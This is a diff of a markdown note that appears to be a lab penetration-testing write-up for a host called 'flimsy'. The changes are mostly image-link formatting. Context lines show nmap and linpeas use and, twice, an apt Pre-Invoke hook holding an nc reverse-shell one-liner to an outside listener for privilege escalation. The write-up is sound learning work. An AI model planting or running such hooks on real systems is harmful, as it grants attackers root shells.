@@ -48,15 +48,15 @@ Nmap done: 1 IP address (1 host up) scanned in 51.63 seconds
 ```
 
 http://192.168.165.220/
-![](Pasted%20image%2020260613155435.png)
+![[Pasted image 20260613155435.png]]
 
 http://192.168.165.220:9443/
-![](Pasted%20image%2020260613155405.png)
+![[Pasted image 20260613155405.png]]
 
 http://192.168.165.220:43500/
-![](Pasted%20image%2020260613155339.png)
+![[Pasted image 20260613155339.png]]
 
-![](Pasted%20image%2020260613155556.png)
+![[Pasted image 20260613155556.png]]
 
 ```zsh
 
@@ -119,13 +119,13 @@ ip a
     inet 192.168.165.220/24 brd 192.168.165.255 scope global ens160
        valid_lft forever preferred_lft forever
 ```
-![](Pasted%20image%2020260613160235.png)
+![[Pasted image 20260613160235.png]]
 
 ```zsh
 ./linpeas.sh
 ```
 
-![](Pasted%20image%2020260613202427.png)
+![[Pasted image 20260613202427.png]]
 
 ```zsh
 franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.204 1234 >/tmp/f"};' > pwn
@@ -163,7 +163,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
 
-![](Pasted%20image%2020260614011221.png)
+![[Pasted image 20260614011221.png]]
 
 ```zsh
 franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.204 1234 >/tmp/f"};' > pwn
